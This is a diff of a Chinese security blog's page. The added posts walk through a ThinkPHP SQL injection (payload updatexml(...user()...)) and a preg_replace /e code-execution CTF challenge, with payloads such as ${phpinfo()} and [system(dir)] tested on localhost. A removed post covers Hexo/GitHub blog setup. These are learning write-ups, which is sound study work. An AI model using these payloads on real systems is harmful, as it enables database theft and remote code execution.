+            //$key:name
+            //$val:{&apos;inc&apos;,&apos;updatexml(1,concat(0x7,user(),0x7e),1)&apos;,&apos;1&apos;} 
+               ...
+                if (false === strpos($key, &apos;.&apos;) &amp;&amp; !in_array($key, $fields, true)) {
+                        ...
+                } elseif (is_null($val)) {
+                   ...
+                } elseif (is_array($val) &amp;&amp; !empty($val)) {
+                    switch ($val[0]) {  #$val[1]:updatexml(1,concat(0x7,user(),0x7e),1)  val[2]:1
+                        case &apos;exp&apos;:
+                            $result[$item] = $val[1];
+                            break;
+                        case &apos;inc&apos;:
+                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
+                            break;
+                        case &apos;dec&apos;:
+                            $result[$item] = $this-&gt;parseKey($val[1]) . &apos;-&apos; . floatval($val[2]);
+                            break;
+                    }
+                } 
+            ...
+            return $result;  #`name`:updatexml(1,concat(0x7,user(),0x7e),1)+1
+        }
+</code></pre><p>我们可看出<code>$val</code>是一个数组,且<code>$val[0]==&#39;inc&#39;</code>,进入对应的switch语句:</p>
+<pre><code>case &apos;inc&apos;:
+    $result[$item] = $this-&gt;parseKey($val[1]) . &apos;+&apos; . floatval($val[2]);
+    break;
+</code></pre><p>对<code>$val[1]</code>也就是<code>updatexml(1,concat(0x7,user(),0x7e),1)</code>进行<code>parsekey()</code>方法的处理,但是并没有什么过滤,原样输出:</p>
+<pre><code>    protected function parseKey($key, $options = [])
+{
+    return $key;//$key：updatexml(1,concat(0x7,user(),0x7e),1)
+}
+</code></pre><p>而<code>floatval($val[2])</code>的结果为1<br>所以我们最后返回到<code>Query.php</code>的<code>insert()</code>方法执行的sql语句是:</p>
+<p><img src="http://static.zybuluo.com/chhyx/okk46bobgycn159pb8a1pbdn/image_1cne41cqcfq1djq1lei18d65173t.png" alt="image_1cne41cqcfq1djq1lei18d65173t.png-114.8kB"></p>
+<p>SQL注入成功。</p>
+<p>另一处的update()造成的注入与这个类似,这里就不再赘述了。小伙伴们如果想复现的话,只需改index.php文件insert为update即可。</p>
+<hr>
+<p>1.搭建thinkphp遇到个坑:<br>在保存index.php后 url查看，发现提示命名空间必须在首行:<br><img src="http://static.zybuluo.com/chhyx/wroy49bujchf58dmq6s8f477/image_1cndv2tcvafm1erc6vj19vp148r16.png" alt="image_1cndv2tcvafm1erc6vj19vp148r16.png-37.3kB"></p>
+<p>填坑:<br>用记事本打开相关文件,在保存时选择ANSI编码即可解决<br><img src="http://static.zybuluo.com/chhyx/c21h6hvf69psufq1uk5jeat0/image_1cndv1f2v1ol81a3km1j1i21l4vp.png" alt="image_1cndv1f2v1ol81a3km1j1i21l4vp.png-56.6kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/14/preg_replace函数与命令执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/14/preg_replace函数与命令执行/" itemprop="url">浅淡preg_replace函数与命令执行</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-14T08:15:41+08:00">
+                2018-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>最近在看法师seay的《代码审计》,在代码审计小技巧一章中提到了preg_replace()函数造成的命令执行,以前不了解,遂去网上查资料,看到红日的表哥们发的有关的题目和详解(链接在结尾),自己跟着复现学习一下。</p>
+</blockquote>
+<hr>
+<p>题目的php代码:</p>
+<pre><code>    header(&quot;Content-Type: text/plain&quot;);
+function complexStrtolower($regex, $value){
+    return preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);
+}
+
+foreach ($_GET as $regex =&gt; $value) {
+    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
+    #var_dump($_GET);
+}
+</code></pre><p>###<strong>代码分析:</strong><br><strong>1.基础知识:</strong><br>首先我们先了解下<code>preg_replace()</code>函数:</p>
+<blockquote>
+<p>###<strong>preg_replace</strong>：(PHP 5.5)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： mixed preg_replace ( mixed \$pattern , mixed \$replacement , mixed<br>\$subject [, int \$limit = -1 [, int &amp;$count ]] )</p>
+<p>搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</p>
+</blockquote>
+<p>观察题目可知,这道题目考察的是 <code>preg_replace()</code> 函数<br>�<code>preg_replace()</code>函数的第一个参数<code>$pattern</code>为正则表达式,如果存在/e修正符,则会造成代码执行漏洞</p>
+<blockquote>
+<p>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p>
+</blockquote>
+<p><code>preg_replace()</code>函数的第二个参数是对前面正则表达式捕获的子匹配项的引用<br>在上面题目的代码中, \1其实代表的就是\1,因为\1在””里头才需要写成\1 一般出现在正则表达式中, \1代表第一个()里面匹配到的内容。</p>
+<p>第三个参数$subject就是源字符串</p>
+<p>这道题的关键是通过控制传入的<code>$_GET</code>参数—&gt;来控制正则的同时修改后面的php代码,达到命令执行</p>
+<p><strong>2.payload分析:</strong></p>
+<p>A.官方给的payload:<br><img src="http://static.zybuluo.com/chhyx/u7qp6ma6swytyuuloxeoizfe/image_1cnaspepa1pc31ma51fpn1del1mkem.png" alt="image_1cnaspepa1pc31ma51fpn1del1mkem.png-56.7kB"></p>
+<pre><code>?.*={${phpinfo()}} 
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/37auiz8d3kxac0nr74jy0o7o/image_1cn9rc5efh9u1mu7cns35v1ggo8l.png" alt="image_1cn9rc5efh9u1mu7cns35v1ggo8l.png-24.8kB"></p>
+<p>不成功,原因是php会对非法的GET参数名进行<code>_</code>处理,我们简单测试一下</p>
+<p>当参数名首字母不为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/c8fue25oesvraweqm1j72xa2/image_1cn9t9vkscq017be1hqsgq51v3uac.png" alt="image_1cn9t9vkscq017be1hqsgq51v3uac.png-24.2kB"></p>
+<p>当参数名首字母为非法字母时:<br><img src="http://static.zybuluo.com/chhyx/5ihlmuv6d6pnio3pokdoacmy/image_1cn9tb1h5t201mh71j9a9judkmap.png" alt="image_1cn9tb1h5t201mh71j9a9judkmap.png-23kB"></p>
+<p>在参数名首字母不为非法字母的情况下: 、+、.、[、_等字符会被php替换为下划线_<br>在参数名首字母为非法字母的情况下,只有<code>.</code>会被替换</p>
+<p>B.<a href="https://mochazz.github.io/" target="_blank" rel="noopener">mochazz</a>大佬给的payload:</p>
+<pre><code>?\S*=${phpinfo()}
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/6h7mup27z0995qx0dvl8q75w/image_1cn9gccpu1uho6u2fhj1csc1hdhm.png" alt="image_1cn9gccpu1uho6u2fhj1csc1hdhm.png-54.5kB"></p>
+<p>没成功</p>
+<p>C.在大佬给出的payload基础上添加@成功执行:<br><img src="http://static.zybuluo.com/chhyx/j37gr8avyr3v45ndy0qytxuf/image_1cn9ggl161m8v3rfdre1qc2ds81j.png" alt="image_1cn9ggl161m8v3rfdre1qc2ds81j.png-61.8kB"></p>
+<p>我又测试了几个特殊字符:<br>空格<br><img src="http://static.zybuluo.com/chhyx/y9o3ndn44gkedid8zj4uh1z0/image_1cn9lo3usqvf1vkc3271tk91blcp.png" alt="image_1cn9lo3usqvf1vkc3271tk91blcp.png-16.4kB"></p>
+<p>tab键:<br><img src="http://static.zybuluo.com/chhyx/7oihl123nb36bkr4gpn07fxj/image_1cn9lr00g1bu21rq12lm18071bvj30.png" alt="image_1cn9lr00g1bu21rq12lm18071bvj30.png-31.4kB"></p>
+<p>注释符:<br><img src="http://static.zybuluo.com/chhyx/aderv7yvf2d1eqxr80b908y8/image_1cn9lorrd9mh1u391h1paml1ms116.png" alt="image_1cn9lorrd9mh1u391h1paml1ms116.png-27.7kB"></p>
+<p>换行回车符:<br><img src="http://static.zybuluo.com/chhyx/xlta3052ww2lfv9r9j61uab7/image_1cn9lsn7u1bh71ranetp106a18pp3d.png" alt="image_1cn9lsn7u1bh71ranetp106a18pp3d.png-31.3kB"></p>
+<p>+号:<br><img src="http://static.zybuluo.com/chhyx/ki9jkuuv3mox01p617nc8m8c/image_1cn9lufli100t107onef33dfl54a.png" alt="image_1cn9lufli100t107onef33dfl54a.png-26.7kB"></p>
+<p>用py脚本FUZZ了一下：<br><img src="http://static.zybuluo.com/chhyx/jc6cemzxfhn044vyxropibf1/image_1cn9pnrum57a2ossu81ebcl227r.png" alt="image_1cn9pnrum57a2ossu81ebcl227r.png-37.8kB"></p>
+<p>可成功执行的<br>ascii为1-31的特殊字符、!、-、@、~、/**/等字符</p>
+<p>添加ascii值为1-31的直接访问:<br><img src="http://static.zybuluo.com/chhyx/1wys2prczkntgxpoyq1kk07c/image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png" alt="image_1cn9p5uqj1qd51ttr6of1vkp12cs64.png-38.8kB"><br>下载下来观察文件内容,其为phpinfo()的内容:<br><img src="http://static.zybuluo.com/chhyx/acmiakc0p0xhnflyq12a21pe/image_1cn9pfe3a17ljb3415l01ir31pj76u.png" alt="image_1cn9pfe3a17ljb3415l01ir31pj76u.png-121.5kB"><br>在burp中也可以直接访问到:<br><img src="http://static.zybuluo.com/chhyx/118ueq4u2bd6fiun7oohft9d/image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png" alt="image_1cn9ppt7k19f01b7p1n8d1vspb7s88.png-74.4kB"></p>
+<p><strong>3.补充知识:</strong><br>A.我们思考为什么匹配到<code>{${phpinfo()}}</code> 或者 <code>${phpinfo()}</code> 才能执行 phpinfo 函数<br>在seay大大的《代码审计–企业级Web代码安全架构》中的审计小技巧篇也有提及php可变变量:</p>
+<blockquote>
+<p>部分PHP应用在写配置文件或者使用preg_replace()函数第二个参数赋值变量时，会用到双引号(“)来代表string型给变量赋值，在PHP语言中，单引号和双引号是有区别的，单引号代表纯字符串，而双引号则是会解析中间的变量，所以在使用双引号时会存在代码执行漏洞。</p>
+</blockquote>
+<p>测试例子:<br><img src="http://static.zybuluo.com/chhyx/y7a4cf9mex9fn4ydf1mkn7l9/image_1cn9s9gp61i104s81irubvh1ds99i.png" alt="image_1cn9s9gp61i104s81irubvh1ds99i.png-24.3kB"></p>
+<p>B./e模式会转义字符：<br>php手册关于<code>preg_replace()</code>的<a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">介绍</a>有提到：</p>
+<blockquote>
+<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL)<br>然后进行后向引用替换。</p>
+</blockquote>
+<p>例子:</p>
+<pre><code>&lt;?php
+    @preg_replace(&quot;/\[(.*?)\]/e&quot;, &quot;\\1&quot;,          
+    $_GET[&apos;code&apos;]);
+var_dump($_GET);
+?&gt;
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/76s7upls9y3hcj5hm5dc1tkv/image_1cna00tq2uld140n170g15k41rt6b6.png" alt="image_1cna00tq2uld140n170g15k41rt6b6.png-45.4kB"></p>
+<p>成功的payload:</p>
+<pre><code>http://127.0.0.1:83/index.php?code=[phpinfo()]
+http://127.0.0.1:83/index.php?code=[system(dir)]
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/fffr1s49ifyec40fncpe8ftw/image_1cnare5m21d2s1nk01j4un8plbm9.png" alt="image_1cnare5m21d2s1nk01j4un8plbm9.png-27.2kB"></p>
+<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a><br><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/13/代码审计Maccms8.X命令执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1066,174 +2171,11 @@ alert(1);  执行的js代码
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/05/用hexo+girhub部署博客/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/05/用hexo+girhub部署博客/" itemprop="url">用hexo+github部署博客</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-05T10:15:41+08:00">
-                2018-09-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-</blockquote>
-<hr>
-<p> 不多说，先上图:<br><img src="http://static.zybuluo.com/chhyx/a0dhagjvyliwehbr6ems59ab/image_1cmkl94jtni51q3n1jbuhk6agt51.png" alt="image_1cmkl94jtni51q3n1jbuhk6agt51.png-1345.8kB"></p>
-<p> <strong>一. 准备部分：</strong><br>   1.下载安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a><br><img src="http://static.zybuluo.com/chhyx/315m63hcb115ks6k69ibg56k/image_1cmklc598a3c1upgo1c18021bdu6e.png" alt="image_1cmklc598a3c1upgo1c18021bdu6e.png-20.5kB"><br>直接默认下一步安装即可,待安装完成后,在cmd运行：</p>
-<p>   node -v</p>
-<p>若显示版本信息 则表明成功安装<br><img src="http://static.zybuluo.com/chhyx/veiud9feuetbol2fec8o14yh/image_1cmklf8dmcdfecn5kdjje1jbn6r.png" alt="image_1cmklf8dmcdfecn5kdjje1jbn6r.png-7.1kB"></p>
-<p>   2.下载安装<a href="https://git-scm.com/download" target="_blank" rel="noopener">Git</a><br>   <img src="http://static.zybuluo.com/chhyx/nkidyyw6phdtmyfxx6s2kvin/image_1cmkloj4jb0m76j86b1897e1l78.png" alt="image_1cmkloj4jb0m76j86b1897e1l78.png-28.2kB"><br>   直接默认安装即可,待安装完成后,在cmd运行：</p>
-<pre><code>git --version
-</code></pre><p>若显示版本信息 则表明成功安装<br>   <img src="http://static.zybuluo.com/chhyx/eofysd32sln0qvj99dvtzodp/image_1cmklr6mv6j593qlgt1u3u16227l.png" alt="image_1cmklr6mv6j593qlgt1u3u16227l.png-8.9kB"></p>
-<p> <strong>二. Git部分</strong></p>
-<p>1.首先注册一个github账号:<br><img src="http://static.zybuluo.com/chhyx/yxjc7ye3qpswxl4vslcktnmw/image_1cmkpnalum071qnj1h8e1ol1vpsga.png" alt="image_1cmkjubqc9aq1kb011vkn3i2j32g.png-91kB"></p>
-<p>然后用新注册的邮箱登陆<br>2.点击NEW repository:<br><img src="http://static.zybuluo.com/chhyx/hqnms4ri266j82lbkebz6p1n/image_1cmkkj8qvqge1ehi48n1l8rflq3a.png" alt="image_1cmkkj8qvqge1ehi48n1l8rflq3a.png-39.3kB"></p>
-<p>3.填写repository name:<br><img src="http://static.zybuluo.com/chhyx/8pnjy0pgo1sjsekom35h5z52/image_1cmkkgpudh85rlvabt81espd2t.png" alt="image_1cmkkgpudh85rlvabt81espd2t.png-67.9kB"></p>
-<p>4.然后在新建的P0rZ9.github.io里,找到setting<br><img src="http://static.zybuluo.com/chhyx/camlvc1fxk5hwh6piz8l0l5v/image_1cmkkqohi929195m151e1cs21lkv3n.png" alt="image_1cmkkqohi929195m151e1cs21lkv3n.png-47.6kB"></p>
-<p>5.在下面的page里选择一个样式:<br><img src="http://static.zybuluo.com/chhyx/2ultb5xv1m8ig5r09dz3osk3/image_1cmkktvug1711h2l2v8183s9ns4k.png" alt="image_1cmkktvug1711h2l2v8183s9ns4k.png-37.2kB"><br><img src="http://static.zybuluo.com/chhyx/4qnpecna39l5et99fdusqkoq/image_1cmkq1up5kj86op14b9vo01eg1gn.png" alt="image_1cmkq1up5kj86op14b9vo01eg1gn.png-110.5kB"><br>然后保存即可<br>6.浏览器访问<a href="https://P0rZ9.github.io" target="_blank" rel="noopener">https://P0rZ9.github.io</a>, 可以正常访问就说明我们的Git部分已经成功完成</p>
-<p> <strong>三.Hexo部分</strong><br>1.安装hexo：<br>创建一个用于存放hexo组件的目录，我这里创建一个blogs目录为例，进入创建好的blogs目录，右键选择Git Bash Here<br>在新打开的Git窗口输入命令:</p>
-<pre><code>npm install -g hexo-cli
-</code></pre><p>2.新建一个网站:<br>安装hexo完成后,在文件夹内(blogs)执行命令:</p>
-<pre><code>hexo init
-</code></pre><p>hexo将会在指定的文件夹内新建所需要的文件，文件目录如下:<br><img src="http://static.zybuluo.com/chhyx/89ttxauk6impiqbrt5i0o744/image_1cmkmv4m41ot4apo85hvfiknqbf.png" alt="image_1cmkmv4m41ot4apo85hvfiknqbf.png-30.4kB"></p>
-<p>3.生成静态页面:</p>
-<pre><code>hexo g
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/xe5jwau68h3t2zpbu6ig25vt/image_1cmkn32581q2012kf1oqn17rv1hsadc.png" alt="image_1cmkn32581q2012kf1oqn17rv1hsadc.png-39.7kB"></p>
-<p>4.启动本地服务器:</p>
-<pre><code>hexo s
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/o4b6ncisb1pvzhoh2w0bw2r5/image_1cmkn6ba514cn3beai7eul0dp.png" alt="image_1cmkn6ba514cn3beai7eul0dp.png-9.4kB"></p>
-<p>5.然后浏览器访问:  <em><a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></em> 即可看到我们的博客首页<br><img src="http://static.zybuluo.com/chhyx/f9j8ade5ne4md4ccl62l1m5l/image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png" alt="image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png-407.2kB"></p>
-<p>当然这只是本地查看博客文章的效果 接下来我们要部署到github page上去</p>
-<p> <strong>四.部署到github</strong><br>1.安装 hexo-deployer-git</p>
-<pre><code>npm install hexo-deployer-git --save
-</code></pre><p>2.修改_config.yml文件：<br> 将</p>
-<pre><code>deploy:
-  type:
-</code></pre><p>修改为(将这里的P0rZ9更换为你自己的username):</p>
-<pre><code>deploy:
-  type: git 
-  repo: https://github.com/P0rZ9/P0rZ9.github.io.git 
-  branch: master
-</code></pre><p>这里需要注意每个冒号后面需要空一格才能填写</p>
-<p>3.部署:<br>运行命令:<br>    hexo g &amp;&amp; hexo d<br>然后根据提示填写github的账号密码<br><img src="http://static.zybuluo.com/chhyx/lumkhwwyb0sugnxlkzat4qdc/image_1cmkp13il1b7rs231fj0skg1jhvft.png" alt="image_1cmkp13il1b7rs231fj0skg1jhvft.png-81.4kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/x2fn4z632fj7r1apt9khryrk/image_1cmkoj5n61mls165h1158o50q9uej.png" alt="image_1cmkoj5n61mls165h1158o50q9uej.png-25.1kB"></p>
-<p>然后访问<a href="https://p0rz9.github.io/" target="_blank" rel="noopener">https://p0rz9.github.io/</a><br><img src="http://static.zybuluo.com/chhyx/gdf0d96y6v3e6jkegzancb0g/image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png" alt="image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png-397.9kB"><br>成功搭建。</p>
-<p> <strong>五. 参考资料</strong><br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo中文指南</a><br><a href="https://www.jianshu.com/p/9df4aba9c25a" target="_blank" rel="noopener">hexo+github搭建blog</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1279,7 +2221,7 @@ alert(1);  执行的js代码
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">51</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
